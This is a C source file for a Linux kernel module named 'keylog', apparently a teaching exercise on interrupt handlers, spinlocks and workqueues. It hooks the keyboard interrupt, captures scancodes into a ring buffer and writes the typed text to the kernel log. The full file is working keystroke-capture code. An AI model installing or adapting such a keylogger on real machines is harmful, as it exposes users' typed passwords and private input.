#include <linux/module.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/ioport.h>
#include <asm/io.h>
#include <linux/spinlock.h>
#include <linux/workqueue.h>
#include <linux/slab.h>

#define MODULE_NAME "keylog"

#define I8042_K_IRQ 1

#define I8042_DATA_REG 0x60
#define I8042_STATUS_REG 0x64

#define RELEASED_MASK 0x80

#define BUFFER_SIZE 1024

struct keylog_data {
	char buf[BUFFER_SIZE];		// кольцевой буфер
	size_t put_idx, get_idx, count; // индексы
	spinlock_t lock;		// переменная блокировка
	struct work_struct workq;	// структура задания
} k_data;

static int irq = I8042_K_IRQ, irq_counter = 0;

static void cycbuf_put_char(struct keylog_data *kdata, char c) {
	if (kdata->count >= BUFFER_SIZE)
		return;

	kdata->buf[kdata->put_idx] = c;
	kdata->put_idx = (kdata->put_idx + 1) % BUFFER_SIZE;
	kdata->count++;
}

static bool cycbuf_get_char(char *c, struct keylog_data *kdata) {
	if (kdata->count > 0) {
		*c = kdata->buf[kdata->get_idx];
		kdata->get_idx = (kdata->get_idx + 1) % BUFFER_SIZE;
		kdata->count--;
		return true;
	}
	return false;
}

static int cycbuf_get_size(struct keylog_data *kdata) {
	return kdata->count;
}

static int cycbuf_get_str(char *str, struct keylog_data *kdata) {
	char ch;
	int i = 0;
	while (cycbuf_get_char(&ch, kdata)) {
		*(str+i)=ch;
		i++;
	}
	str[i]=0;
	return i;
}

static void cycbuf_reset_buffer(struct keylog_data *kdata) {
	kdata->count = 0;
	kdata->put_idx = 0;
	kdata->get_idx = 0;
}

static u8 i8042_read_data(void) {
	u8 val;
	val = inb(I8042_DATA_REG);
	return val;       
}

static int is_key_pressed(u8 scancode) {
	return !(scancode & RELEASED_MASK);
}

static int scancode2ascii(u8 scancode) {
	static char *row1 = "1234567890";
	static char *row2 = "qwertyuiop";
	static char *row3 = "asdfghjkl";
	static char *row4 = "zxcvbnm";

	scancode &= ~RELEASED_MASK;
	if (scancode >= 0x02 && scancode <= 0x0b)
		return *(row1 + scancode - 0x02);
	if (scancode >= 0x10 && scancode <= 0x19)
		return *(row2 + scancode - 0x10);
	if (scancode >= 0x1e && scancode <= 0x26)
		return *(row3 + scancode - 0x1e);
	if (scancode >= 0x2c && scancode <= 0x32)
		return *(row4 + scancode - 0x2c);
	if (scancode == 0x39)	return ' ';
	if (scancode == 0x1c)	return '\n';
	if (scancode == 12)	return '-';
	if (scancode == 53)	return '/';
	return '?';
}

static void flush_data( struct work_struct *work ) {
	unsigned long flags;
	struct keylog_data *kdata = container_of(work, struct keylog_data, workq);
	printk (KERN_INFO "07-5 - In Workqueue. Flushing\n");
	char *buffer = kmalloc(cycbuf_get_size(kdata)+1,GFP_KERNEL);
	// Включаем блокировку
	spin_lock_irqsave(&kdata->lock,flags);
	int len = cycbuf_get_str((char*)buffer,kdata);
	spin_unlock_irqrestore(&kdata->lock,flags); // выходим из секции
	printk (KERN_INFO "07-5 - Buffer: [%d] %s\n",len,buffer);
	kfree(buffer);
	return;
}

static irqreturn_t my_interrupt( int irq, void *dev_id ) {
	u8 scancode = 0;
	int pressed, ch;
	irq_counter++;
	struct keylog_data *kdata = (struct keylog_data *)dev_id;
	scancode = i8042_read_data();
	ch = scancode2ascii(scancode);
	if ((pressed=is_key_pressed(scancode))) {
		// Включаем блокировку
		spin_lock(&kdata->lock);
		cycbuf_put_char(kdata, ch); // критическая секция
		spin_unlock(&kdata->lock); // выходим из секции
	} else {
		if ( ch == '\n' ) {
			printk (KERN_INFO "07-5 - Got new line. Sheduling flush workqueue\n");
			schedule_work(&kdata->workq);
		}
	}
	return IRQ_NONE; 
}

static int __init my_init( void ) {
	unsigned long flags;
        spin_lock_init(&k_data.lock);			// Инициализация спин-блокировки
        spin_lock_irqsave(&k_data.lock,flags);		// Старт блокировки
        cycbuf_reset_buffer(&k_data);  			// Критическая секция
        spin_unlock_irqrestore(&k_data.lock,flags);	// Разблокировка
	if ( request_irq( irq, my_interrupt, IRQF_SHARED, "my_interrupt", &k_data ) )
		return -1;
	printk( KERN_INFO "07.5 - Successfully loading ISR handler on IRQ %d\n", irq );
	INIT_WORK( &k_data.workq, flush_data );	
	return 0;
}
static void __exit my_exit( void ) {
	unsigned long flags;
	char *buffer;
	int i = 0;
	char ch;
	synchronize_irq( irq );
	free_irq( irq, &k_data );
	printk( KERN_INFO "07.5 - Successfully unloading, irq_counter = %d\n", irq_counter );
	flush_scheduled_work();
	buffer = kmalloc(cycbuf_get_size(&k_data)+1,GFP_KERNEL);
	spin_lock_irqsave(&k_data.lock,flags); 		// Начало критической секции
	int len = cycbuf_get_str((char*)buffer,&k_data);
	printk (KERN_INFO "07-5 - Buffer: [%d] %s\n",len,buffer);
	spin_unlock_irqrestore(&k_data.lock,flags);
	kfree(buffer);
}
module_init( my_init );
module_exit( my_exit );
MODULE_LICENSE( "GPL v2" );
